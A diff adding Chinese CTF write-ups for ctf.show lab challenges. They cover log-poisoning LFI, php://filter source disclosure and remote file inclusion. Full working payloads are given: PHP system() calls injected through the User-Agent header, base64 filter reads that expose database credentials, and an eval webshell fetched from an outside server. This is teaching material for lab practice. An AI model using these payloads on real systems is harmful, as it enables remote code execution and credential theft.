@@ -4844,6 +4844,366 @@ $flag = "CTF{no_space_to_execute_shell_commands}";</div>
 
 ------
 
+### 日志文件包含
+
+进入靶机后看到一个PHP LFI/RFI Code Executor。
+
+为了判断是LFI（本地文件上传漏洞）还是RFI（远程文件包含漏洞），我们先输入`/etc/passwd`，看到靶机的执行结果如下，由此可知这道题是本地文件上传漏洞即LFI。
+
+```
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/bin/false
+```
+
+> 解释：如何判断是LFI？
+>
+> 一、第一步：看 “功能入口”—— 有没有 “让你输入文件路径” 的地方
+>
+> LFI 漏洞的前提是 “服务器需要处理你输入的文件路径”，所以先看功能是否符合以下特征，这是最直观的信号：
+>
+> - 明显的文件路径输入框：比如你之前遇到的 “Enter file path” 输入框，提示你 “输入文件路径”，这是最直接的 LFI 风险点（相当于管理员问你 “要哪本书的位置”）；
+> - URL 参数里的 “文件相关关键词”：比如访问链接是 http://xxx.com/index.php?file=home，这里的file=参数很可能是在接收文件路径（把home换成/etc/passwd就能测试）；
+> - 表单 / 接口里的 “路径类参数”：比如上传文件后，接口需要你输入 “文件存储路径”，或下载功能需要输入 “文件路径”，这些都可能触发 LFI。
+>
+> 二、第二步：做 “验证测试”—— 输入 “已知文件路径” 看反应
+>
+> 找到风险功能后，输入 “服务器上一定存在的文件路径”，看服务器是否返回文件内容（或相关反馈），这是验证 LFI 的核心步骤。常用的测试路径和判断标准如下：
+>
+> |  测试路径（Linux 系统）   |                    预期结果（证明是 LFI）                    |                     为什么选这个路径？                      |
+> | :-----------------------: | :----------------------------------------------------------: | :---------------------------------------------------------: |
+> |       `/etc/passwd`       | 页面显示服务器的用户列表（比如`root:x:0:0:root:/root:/bin/bash`） | 这是Linux系统必存在的文件，且权限宽松，几乎所有服务器都能读 |
+> | `/var/www/html/index.php` | 页面显示网站首页的 PHP 源代码（或乱码，但不是 “文件不存在”） |     网站自身的首页文件，肯定存在，能排除 “路径格式错误”     |
+> |      `../index.php`       | 若输入绝对路径（/xxx）被过滤，用相对路径跳转，能显示首页则有效 |        测试是否能绕开 “绝对路径限制”，进一步确认漏洞        |
+>
+> 比如输入`/proc/self/environ`和`/var/log/nginx/access.log`，虽然出现 “Permission denied” 或 “日志内容”，但服务器没有直接提示 “非法输入” 或 “不允许此操作”，而是返回 “权限不足”、“文件存在但读不了”、“文件内容”—— 这些都是 LFI 存在的证据，只是需要找 “能读的文件”。（所有错误都是 “文件权限”、“文件不存在”，没有数据库或脚本相关错误 —— 排除其他漏洞，确认是 LFI。）
+>
+> `/etc/passwd` 的作用是 “在确认LFI漏洞时能用上”，它的局限性很明显：
+>
+> - 只能 “读固定内容”，不能 “执行命令”：`/etc/passwd` 是系统静态文件，里面只有用户信息，没有任何 “可执行的代码位”—— 最多能读到用户列表，却没法让它读 `flag.php`。
+>
+> - 不含任何 flag 相关信息：CTF 题的 flag 几乎不会藏在 `/etc/passwd` 里（它是系统基础文件，改了会出问题），读它只是为了确认 “服务器真的会按照用户输入的路径读文件”，仅此而已。
+
+输入`/proc/self/environ`，靶机的执行结果中出现了“Permission denied”，也就是在执行`include()`时被系统拒绝访问该文件，导致文件包含失败。`/proc/self/environ`是 Linux 系统里的 “进程环境变量文件”，每个运行的程序（包括`Web`服务器）都有一个，记录着程序运行时的环境信息（比如请求头、运行用户）。大多数的Linux服务器中，Web 进程（比如`www-data`用户）都有权限读这个文件，不容易出现 “Permission denied”，不巧的是这道题的靶机没有权限。这个文件会实时记录请求的`User-Agent`（包含我们修改的指令），不需要等日志刷新，注入后马上能用。
+
+```
+<br />
+<b>Warning</b>:  include(/proc/31/environ): failed to open stream: Permission denied in <b>/var/www/html/index.php</b> on line <b>107</b><br />
+<br />
+<b>Warning</b>:  include(): Failed opening '/proc/self/environ' for inclusion (include_path='.:/usr/local/lib/php') in <b>/var/www/html/index.php</b> on line <b>107</b><br />
+```
+
+输入`/var/log/nginx/access.log`，这是`Nginx`服务器的 “访问日志文件”，记录所有访问服务器的请求（谁访问、什么时候访问、用什么设备访问）。Nginx服务器的日志文件肯定会给`Web`进程读权限（不然服务器自己都看不了日志），所以几乎不会出现 “Permission denied”。此外，我们修改`User-Agent`一定会被写进日志里，因为Web服务器会把每个请求头记录进日志，我们可以把`User-Agent`改成`PHP`代码（比如 `<?php system('cat /var/www/html/flag.php');?>`），那么这段代码就会被写入日志中“存起来”。当我们再次输入`/var/log/nginx/access.log`访问包含LFI漏洞的日志时，服务器会把日志中的PHP内容当成PHP 代码执行。虽然不同服务器日志路径可能不一样，但只要记住“Web 服务器名 + log 目录 + access.log”（比如`Apache`是`/var/log/apache2/access.log`），即可访问大多数靶机。
+
+用`Burp Suite`抓包构造`POST`请求，`file=/var/log/nginx/access.log`，在`User-Agent`请求头中插入`<?php system('ls');?>`，查看靶机当前目录中的文件。
+
+```
+POST / HTTP/1.1
+Host: 129fa924-363c-43ed-ad83-4bad86239b29.challenge.ctf.show
+Content-Length: 38
+Cache-Control: max-age=0
+Origin: http://129fa924-363c-43ed-ad83-4bad86239b29.challenge.ctf.show
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 <?php system('ls');?>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://129fa924-363c-43ed-ad83-4bad86239b29.challenge.ctf.show/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: keep-alive
+
+file=%2Fvar%2Flog%2Fnginx%2Faccess.log
+```
+
+再次输入`/var/log/nginx/access.log`时，靶机中的日志记录多了这一条内容：
+
+> 172.12.0.2 - - [29/Jan/2026:15:07:21 +0000] "POST / HTTP/1.1" 200 1326 "http://129fa924-363c-43ed-ad83-4bad86239b29.challenge.ctf.show/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 flag.php index.php "
+
+继续用`Burp Suite`抓包构造`POST`请求，`file=/var/log/nginx/access.log`，在`User-Agent`请求头中插入`<?php system('cat /var/www/html/flag.php');?>`，查看靶机的`flag.php`文件。
+
+```
+POST / HTTP/1.1
+Host: 129fa924-363c-43ed-ad83-4bad86239b29.challenge.ctf.show
+Content-Length: 38
+Cache-Control: max-age=0
+Origin: http://129fa924-363c-43ed-ad83-4bad86239b29.challenge.ctf.show
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 <?php system('cat /var/www/html/flag.php');?>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://129fa924-363c-43ed-ad83-4bad86239b29.challenge.ctf.show/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: keep-alive
+
+file=%2Fvar%2Flog%2Fnginx%2Faccess.log
+```
+
+再次输入`/var/log/nginx/access.log`时，靶机中的日志记录多了这一条内容：
+
+> 172.12.0.2 - - [29/Jan/2026:15:07:48 +0000] "POST / HTTP/1.1" 200 1407 "http://129fa924-363c-43ed-ad83-4bad86239b29.challenge.ctf.show/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 <?php $flag = "CTF{php_access_l0g_lf1_is_fun}";"
+
+用`HackBar`构造`POST`请求，`Body`填入`file=/var/log/nginx/access.log`，点击`MODIFY HEADER`添加头文件`User-Agent`，值为`<?php system('cat /var/www/html/flag.php');?>`。
+
+```php
+172.12.0.2 - - [28/Jan/2026:03:55:13 +0000] "POST / HTTP/1.1" 200 1468 "https://a85ac693-f83c-468d-b25f-77cb7cebc082.challenge.ctf.show/" "<?php
+$flag = "CTF{php_access_l0g_lf1_is_fun}";"
+```
+
+提交`CTF{php_access_l0g_lf1_is_fun}`即可。
+
+------
+
+### php://filter读取源码
+
+进入靶机后，看到一个PHP LFI/RFI Code Executor。为了判断是LFI（本地文件上传漏洞）还是RFI（远程文件包含漏洞），我们先在`Enter file path:`输入`/etc/passwd`时，看到靶机的`Include Result:`为`Error: Invalid input. Please enter a valid file path.`，读取系统文件已经被过滤掉啦。
+
+在PHP中，`php://filter`协议用于对输入数据进行过滤和转换。它提供了一种安全的方式来处理用户输入，以防止潜在的注入攻击和跨站脚本攻击（XSS）等安全问题。然而，在使用php://filter协议时，如果未对输入进行适当的验证和过滤，可能会导致任意文件读取漏洞，使得攻击者可以通过构造特定的输入来读取服务器上的任意文件。比如我们可以使用`PHP`伪协议来实现读取`index.php`。
+
+```
+php://filter/convert.base64-encode/resource=index.php
+```
+
+靶机显示信息中会包含`base64`编码信息。
+
+```
+File contents:
+PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+UEhQIExGSS9SRkkgQ29kZSBFeGVjdXRvcjwvdGl0bGU+CiAgICA8c3R5bGU+CiAgICAgICAgYm9keSB7CiAgICAgICAgICAgIGZvbnQtZmFtaWx5OiAnQXJpYWwnLCBzYW5zLXNlcmlmOwogICAgICAgICAgICBiYWNrZ3JvdW5kOiBsaW5lYXItZ3JhZGllbnQoMTM1ZGVnLCAjMWUzYzcyLCAjMmE1Mjk4KTsKICAgICAgICAgICAgaGVpZ2h0OiAxMDB2aDsKICAgICAgICAgICAgZGlzcGxheTogZmxleDsKICAgICAgICAgICAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7CiAgICAgICAgICAgIGFsaWduLWl0ZW1zOiBjZW50ZXI7CiAgICAgICAgICAgIG1hcmdpbjogMDsKICAgICAgICAgICAgY29sb3I6IHdoaXRlOwogICAgICAgIH0KICAgICAgICAuY29udGFpbmVyIHsKICAgICAgICAgICAgYmFja2dyb3VuZDogcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjEpOwogICAgICAgICAgICBiYWNrZHJvcC1maWx0ZXI6IGJsdXIoMTBweCk7CiAgICAgICAgICAgIGJvcmRlci1yYWRpdXM6IDEwcHg7CiAgICAgICAgICAgIHBhZGRpbmc6IDJyZW07CiAgICAgICAgICAgIHdpZHRoOiA2MDBweDsKICAgICAgICAgICAgYm94LXNoYWRvdzogMCAxNXB4IDMwcHggcmdiYSgwLCAwLCAwLCAwLjIpOwogICAgICAgICAgICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgICAgICAgfQogICAgICAgIC5jb250YWluZXIgaDIgewogICAgICAgICAgICBtYXJnaW4tYm90dG9tOiAxLjVyZW07CiAgICAgICAgfQogICAgICAgIC5mb3JtLWdyb3VwIHsKICAgICAgICAgICAgbWFyZ2luLWJvdHRvbTogMXJlbTsKICAgICAgICAgICAgdGV4dC1hbGlnbjogbGVmdDsKICAgICAgICB9CiAgICAgICAgLmZvcm0tZ3JvdXAgbGFiZWwgewogICAgICAgICAgICBkaXNwbGF5OiBibG9jazsKICAgICAgICAgICAgbWFyZ2luLWJvdHRvbTogMC41cmVtOwogICAgICAgICAgICBmb250LXdlaWdodDogYm9sZDsKICAgICAgICB9CiAgICAgICAgLmZvcm0tZ3JvdXAgdGV4dGFyZWEgewogICAgICAgICAgICB3aWR0aDogMTAwJTsKICAgICAgICAgICAgcGFkZGluZzogMC44cmVtOwogICAgICAgICAgICBib3JkZXI6IG5vbmU7CiAgICAgICAgICAgIGJvcmRlci1yYWRpdXM6IDVweDsKICAgICAgICAgICAgYmFja2dyb3VuZDogcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjIpOwogICAgICAgICAgICBjb2xvcjogd2hpdGU7CiAgICAgICAgICAgIG1pbi1oZWlnaHQ6IDIwMHB4OwogICAgICAgICAgICBmb250LWZhbWlseTogbW9ub3NwYWNlOwogICAgICAgIH0KICAgICAgICAuZm9ybS1ncm91cCB0ZXh0YXJlYTpmb2N1cyB7CiAgICAgICAgICAgIG91dGxpbmU6IG5vbmU7CiAgICAgICAgICAgIGJhY2tncm91bmQ6IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC4zKTsKICAgICAgICB9CiAgICAgICAgYnV0dG9uIHsKICAgICAgICAgICAgd2lkdGg6IDEwMCU7CiAgICAgICAgICAgIHBhZGRpbmc6IDAuOHJlbTsKICAgICAgICAgICAgYm9yZGVyOiBub25lOwogICAgICAgICAgICBib3JkZXItcmFkaXVzOiA1cHg7CiAgICAgICAgICAgIGJhY2tncm91bmQ6ICM0Q0FGNTA7CiAgICAgICAgICAgIGNvbG9yOiB3aGl0ZTsKICAgICAgICAgICAgZm9udC13ZWlnaHQ6IGJvbGQ7CiAgICAgICAgICAgIGN1cnNvcjogcG9pbnRlcjsKICAgICAgICAgICAgdHJhbnNpdGlvbjogYmFja2dyb3VuZCAwLjNzOwogICAgICAgIH0KICAgICAgICBidXR0b246aG92ZXIgewogICAgICAgICAgICBiYWNrZ3JvdW5kOiAjNDVhMDQ5OwogICAgICAgIH0KICAgICAgICAucmVzdWx0IHsKICAgICAgICAgICAgbWFyZ2luLXRvcDogMXJlbTsKICAgICAgICAgICAgcGFkZGluZzogMC44cmVtOwogICAgICAgICAgICBib3JkZXItcmFkaXVzOiA1cHg7CiAgICAgICAgICAgIGJhY2tncm91bmQ6IHJnYmEoMCwgMCwgMCwgMC4zKTsKICAgICAgICAgICAgdGV4dC1hbGlnbjogbGVmdDsKICAgICAgICAgICAgd2hpdGUtc3BhY2U6IHByZS13cmFwOwogICAgICAgICAgICBmb250LWZhbWlseTogbW9ub3NwYWNlOwogICAgICAgICAgICBtaW4taGVpZ2h0OiAxMDBweDsKICAgICAgICAgICAgbWF4LWhlaWdodDogMzAwcHg7CiAgICAgICAgICAgIG92ZXJmbG93LXk6IGF1dG87CiAgICAgICAgfQogICAgPC9zdHlsZT4KPC9oZWFkPgo8Ym9keT4KICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAgICAgPGgyPlBIUCBMRkkvUkZJIENvZGUgRXhlY3V0b3I8L2gyPgogICAgICAgIDxmb3JtIG1ldGhvZD0iUE9TVCI+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAiPgogICAgICAgICAgICAgICAgPGxhYmVsIGZvcj0iZmlsZSI+RW50ZXIgZmlsZSBwYXRoOjwvbGFiZWw+CiAgICAgICAgICAgICAgICA8dGV4dGFyZWEgaWQ9ImZpbGUiIG5hbWU9ImZpbGUiIHBsYWNlaG9sZGVyPSIiPjw/cGhwIAogICAgICAgICAgICAgICAgICAgIGlmIChpc3NldCgkX1BPU1RbJ2ZpbGUnXSkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgZWNobyBodG1sc3BlY2lhbGNoYXJzKCRfUE9TVFsnZmlsZSddKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICA/PjwvdGV4dGFyZWE+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCI+SW5jbHVkZSBmaWxlPC9idXR0b24+CiAgICAgICAgPC9mb3JtPgoKICAgICAgICA8P3BocCBpZiAoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10gPT09ICdQT1NUJyAmJiBpc3NldCgkX1BPU1RbJ2ZpbGUnXSkpOiA/PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIj4KICAgICAgICAgICAgICAgIDxsYWJlbD5JbmNsdWRlIFJlc3VsdDo8L2xhYmVsPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0icmVzdWx0Ij48P3BocAogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgImRiLnBocCI7CiAgICAgICAgICAgICAgICAgICAgZnVuY3Rpb24gdmFsaWRhdGVfZmlsZV9jb250ZW50cygkZmlsZSkgewoKICAgICAgICAgICAgICAgICAgICAgICAgaWYocHJlZ19tYXRjaCgnL1teYS16QS1aMC05XC9cKz1dLycsICRmaWxlKSl7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7ICAgCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICAvLyBWYWxpZGF0ZSBpbnB1dCBjaGFyYWN0ZXJzCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChwcmVnX21hdGNoKCcvbG9nfG5naW54fGFjY2Vzcy8nLCAkX1BPU1RbJ2ZpbGUnXSkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBFeGNlcHRpb24oJ0ludmFsaWQgaW5wdXQuIFBsZWFzZSBlbnRlciBhIHZhbGlkIGZpbGUgcGF0aC4nKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgb2Jfc3RhcnQoKTsKICAgICAgICAgICAgICAgICAgICAgICAgZWNobyBmaWxlX2dldF9jb250ZW50cygkX1BPU1RbJ2ZpbGUnXSk7CiAgICAgICAgICAgICAgICAgICAgICAgICRvdXRwdXQgPSBvYl9nZXRfY2xlYW4oKTsKICAgICAgICAgICAgICAgICAgICAgICAgaWYoIXZhbGlkYXRlX2ZpbGVfY29udGVudHMoJG91dHB1dCkpewogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IEV4Y2VwdGlvbignSW52YWxpZCBpbnB1dC4gUGxlYXNlIGVudGVyIGEgdmFsaWQgZmlsZSBwYXRoLicpOwogICAgICAgICAgICAgICAgICAgICAgICB9ZWxzZXsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gJ0ZpbGUgY29udGVudHM6JzsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gJzxicj4nOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWNobyAkb3V0cHV0OwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uICRlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gJ0Vycm9yOiAnIC4gaHRtbHNwZWNpYWxjaGFycygkZS0+Z2V0TWVzc2FnZSgpKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICA/PjwvZGl2PgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8P3BocCBlbmRpZjsgPz4KICAgIDwvZGl2Pgo8L2JvZHk+CjwvaHRtbD4=
+```
+
+直接在`cmd`命令行用`php -r "var_dump(base64_decode(''));"`进行`base64`解码，得到源码信息。
+
+```php+HTML
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PHP LFI/RFI Code Executor</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #1e3c72, #2a5298);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0;
+            color: white;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 10px;
+            padding: 2rem;
+            width: 600px;
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.2);
+            text-align: center;
+        }
+        .container h2 {
+            margin-bottom: 1.5rem;
+        }
+        .form-group {
+            margin-bottom: 1rem;
+            text-align: left;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: bold;
+        }
+        .form-group textarea {
+            width: 100%;
+            padding: 0.8rem;
+            border: none;
+            border-radius: 5px;
+            background: rgba(255, 255, 255, 0.2);
+            color: white;
+            min-height: 200px;
+            font-family: monospace;
+        }
+        .form-group textarea:focus {
+            outline: none;
+            background: rgba(255, 255, 255, 0.3);
+        }
+        button {
+            width: 100%;
+            padding: 0.8rem;
+            border: none;
+            border-radius: 5px;
+            background: #4CAF50;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        button:hover {
+            background: #45a049;
+        }
+        .result {
+            margin-top: 1rem;
+            padding: 0.8rem;
+            border-radius: 5px;
+            background: rgba(0, 0, 0, 0.3);
+            text-align: left;
+            white-space: pre-wrap;
+            font-family: monospace;
+            min-height: 100px;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>PHP LFI/RFI Code Executor</h2>
+        <form method="POST">
+            <div class="form-group">
+                <label for="file">Enter file path:</label>
+                <textarea id="file" name="file" placeholder=""><?php
+                    if (isset($_POST['file'])) {
+                        echo htmlspecialchars($_POST['file']);
+                    }
+                ?></textarea>
+            </div>
+            <button type="submit">Include file</button>
+        </form>
+
+        <?php if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['file'])): ?>
+            <div class="form-group">
+                <label>Include Result:</label>
+                <div class="result"><?php
+                    include "db.php";
+                    function validate_file_contents($file) {
+
+                        if(preg_match('/[^a-zA-Z0-9\/\+=]/', $file)){
+                            return false;
+                        }
+                        return true;
+                    }
+
+                    try {
+                        // Validate input characters
+                        if (preg_match('/log|nginx|access/', $_POST['file'])) {
+                            throw new Exception('Invalid input. Please enter a valid file path.');
+                        }
+
+                        ob_start();
+                        echo file_get_contents($_POST['file']);
+                        $output = ob_get_clean();
+                        if(!validate_file_contents($output)){
+                            throw new Exception('Invalid input. Please enter a valid file path.');
+                        }else{
+                            echo 'File contents:';
+                            echo '<br>';
+                            echo $output;
+                        }
+
+                    } catch (Exception $e) {
+                        echo 'Error: ' . htmlspecialchars($e->getMessage());
+                    }
+                ?></div>
+            </div>
+        <?php endif; ?>
+    </div>
+</body>
+</html>
+```
+
+我们可以看到关键代码片段，用`include`文件包含了`db.php`，看这文件名应该跟数据库相关。
+
+```php+HTML
+<label>Include Result:</label>
+<div class="result"><?php
+    include "db.php";
+    function validate_file_contents($file) {
+
+        if(preg_match('/[^a-zA-Z0-9\/\+=]/', $file)){
+            return false;
+        }
+        return true;
+    }
+```
+
+继续使用`PHP`伪协议，读取`db.php`。靶机显示信息如下：
+
+```
+File contents:
+PD9waHAKCiRzZXJ2ZXJuYW1lID0gImxvY2FsaG9zdCI7CiR1c2VybmFtZSA9ICJyb290IjsKJHBhc3N3b3JkID0gIkNURnszZWNyZXRfcGFzc3cwcmRfaGVyZX0iOwokZGJuYW1lID0gImJvb2tfc3RvcmUiOw==
+```
+
+直接在`cmd`命令行用`php -r "var_dump(base64_decode(''));"`进行`base64`解码，得到源码信息。
+
+```php
+<?php
+
+$servername = "localhost";
+$username = "root";
+$password = "CTF{3ecret_passw0rd_here}";
+$dbname = "book_store";
+```
+
+好家伙，数据库名和账号密码都出来。提交`CTF{3ecret_passw0rd_here}`即可。
+
+------
+
+### 远程文件包含（RFI）
+
+输入`/etc/passwd`发现可以正常读取。
+
+```
+root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/bin/false
+```
+
+而访问日志文件或使用`PHP`伪协议读取文件会显示：禁止访问敏感目录或文件。
+
+在VPS服务器上写入以下内容到`1.txt`，然后用靶机包含远程服务器上的`WebShell`文本内容。
+
+```php
+<?php highlight_file(__FILE__);eval($_GET[1]);?>
+```
+
+用URL传参`/?path=https%3A%2F%2Ftanyaodan.com%2Ftest%2F1.txt&1=system(%27ls%27);`发送`GET`请求，靶机的响应信息如下：
+
+```php+HTML
+<?php highlight_file(__FILE__);eval($_GET[1]);?> 
+flag.php index.php
+```
+
+`/?path=https%3A%2F%2Ftanyaodan.com%2Ftest%2F1.txt&1=system(%27cat%20flag.php%27);`，右键查看源码可以看到注释，`flag.php`太苟啦。
+
+```html
+<!--?php
+
+$flag = "CTF{http_rfi_1s_fun}";            </div-->
+```
+
+`/?path=https%3A%2F%2Ftanyaodan.com%2Ftest%2F1.txt&1=system(%27tac%20f*%27);`更直观。
+
+```php
+<?php highlight_file(__FILE__);eval($_GET[1]);?> $flag = "CTF{http_rfi_1s_fun}";
+```
+
+提交`CTF{http_rfi_1s_fun}`即可。
+
+------
+
 ### 驷马难追
 
 PHP代码审计题。首先num=114514绕过，然后需要`intval(num)==1919810`获取`flag`。
